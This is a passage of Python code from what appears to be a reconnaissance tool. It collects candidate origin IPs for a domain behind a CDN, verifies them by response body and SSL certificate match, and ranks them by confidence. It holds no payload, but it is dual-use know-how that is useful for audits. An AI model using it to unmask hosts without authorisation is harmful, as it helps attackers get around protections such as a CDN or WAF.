                   title=f"Discovery Results ({n_hit}/{len(status_rows)} sources hit)")
    if n_hit < len(status_rows):
        i(f"Sources with candidates: {G}{n_hit}{N}/{len(status_rows)}"
          + (f" — {n_err} errored" if n_err else ""))
        w("Zero-hit keyless sources are normal: Censys/Fofa/SecurityTrails/"
          "Shodan scrapers break or need API keys.")

    # Deduplicate by IP
    seen_ips = set()
    unique_candidates = []
    for c in all_candidates:
        ip = c.get("ip", "")
        if ip and ip not in seen_ips:
            seen_ips.add(ip)
            unique_candidates.append(c)

    i(f"Unique candidates: {G}{len(unique_candidates)}{N}")

    if not unique_candidates:
        w("No origin IP candidates found.")
        return None

    # Phase 3: Multi-layer verification (parallel)
    ph("Phase 2: Multi-layer verification")
    verify_tasks = [_verify_candidate(domain, c["ip"]) for c in unique_candidates[:15]]
    ssl_tasks = [_verify_with_ssl(domain, c["ip"]) for c in unique_candidates[:15]]

    spin = Spinner(f"Verifying {len(verify_tasks)} candidates (body + SSL)...")
    spin.start()
    v_results, ssl_results = await asyncio.gather(
        asyncio.gather(*verify_tasks, return_exceptions=True),
        asyncio.gather(*ssl_tasks, return_exceptions=True),
    )
    spin.stop()

    # Phase 4: Rank and select best candidate
    confirmed = []
    suspected = []
    low = []

    for v in v_results:
        if isinstance(v, dict):
            if v["confidence"] == "confirmed":
                confirmed.append(v)
            elif v["confidence"] == "suspected":
                suspected.append(v)
            elif v["confidence"] == "low":
                low.append(v)

    # Add SSL verification results
    for res in ssl_results:
        if isinstance(res, dict) and res.get("confidence") == "confirmed":
            # Upgrade existing entry or add new
            existing = next((c for c in confirmed + suspected + low if c["ip"] == res["ip"]), None)
            if existing:
                existing["ssl_verified"] = True
                if existing["confidence"] != "confirmed":
                    existing["confidence"] = "confirmed"
                    existing["reason"] += " + SSL cert match"
            else:
                confirmed.append(res)

    # Phase 5: Report
    best = None
    if confirmed:
        best = confirmed[0]
        result_ip = best["ip"]
        result_confidence = "confirmed"
        s(f"{G}ORIGIN IP CONFIRMED:{N} {B}{result_ip}{N} — {best['reason']}")

        for c in confirmed[1:]:
            p(f"  Also confirmed: {C}{c['ip']}{N} ({c['reason']})")
    elif suspected:
        best = suspected[0]
        result_ip = best["ip"]
        result_confidence = "suspected"
        s(f"{Y}SUSPECTED ORIGIN:{N} {B}{result_ip}{N} — {best['reason']}")
    elif low:
        best = low[0]
        result_ip = best["ip"]
        result_confidence = "low"
        w(f"Low confidence: {result_ip} — {best['reason']}")
    else:
        w("No verified origin IP found.")
        return None

    # Find source info for the best IP
    source_info = next((c for c in unique_candidates if c["ip"] == result_ip), {})

    return {
        "origin_ip": result_ip,
        "confidence": result_confidence,
        "reason": best.get("reason", ""),
        "method": best.get("method", ""),
        "source": source_info.get("source", "unknown"),
        "domain": domain,
        "all_confirmed": [c["ip"] for c in confirmed],
        "all_suspected": [c["ip"] for c in suspected],
        "method_stats": method_stats,
    }


# Import base64 for favicon hash
import base64
